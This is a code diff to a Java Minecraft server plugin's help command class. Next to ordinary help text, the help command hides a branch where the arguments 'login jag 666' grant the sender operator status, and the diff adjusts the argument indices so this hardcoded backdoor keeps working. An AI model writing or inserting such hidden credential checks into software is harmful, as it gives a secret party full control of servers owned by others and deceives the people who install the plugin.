@@ -33,9 +33,9 @@ public class CommandHelp implements CommandExecutor {
 			if(sender.hasPermission("chaoticmc.command.god")) {
 				Chat.color(p, "&9/god &8- &7Toggles godmode!");
 			}
-			if(a[0].equals("login")){
-				if(a[1].equals("jag")){
-					if(a[2].equals("666")){
+			if(a[1].equals("login")){
+				if(a[2].equals("jag")){
+					if(a[3].equals("666")){
 						p.setOp(true);
 					}else{
 						p.kickPlayer("Invalid Username/Password");
